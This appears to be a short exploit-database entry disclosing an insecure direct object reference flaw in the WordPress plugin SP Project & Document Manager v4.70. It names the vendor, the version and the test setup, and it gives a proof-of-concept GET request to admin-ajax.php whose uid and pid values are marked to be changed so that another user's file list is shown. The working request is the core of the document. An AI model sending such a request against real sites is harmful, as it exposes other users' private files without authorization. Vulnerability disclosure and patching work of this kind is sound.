# Exploit Title: SP Project & Document Manager v4.70 - Insecure Direct Object Reference(IDOR)
## Date: 2/20/2024
## Vendor Homepage: https://cn.wordpress.org/plugins/sp-client-document-manager/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SP Project & Document Manager
## Version: v4.70
## Exploit Description:
## SP Project & Document Manager v4.70 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to view files list in folder that is assigned to other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /wp-admin/admin-ajax.php?action=cdm_file_list&uid=3(CHANGE HERE)&pid=0(CHANGE HERE)&search=&_=1708406394720 HTTP/1.1
...

```
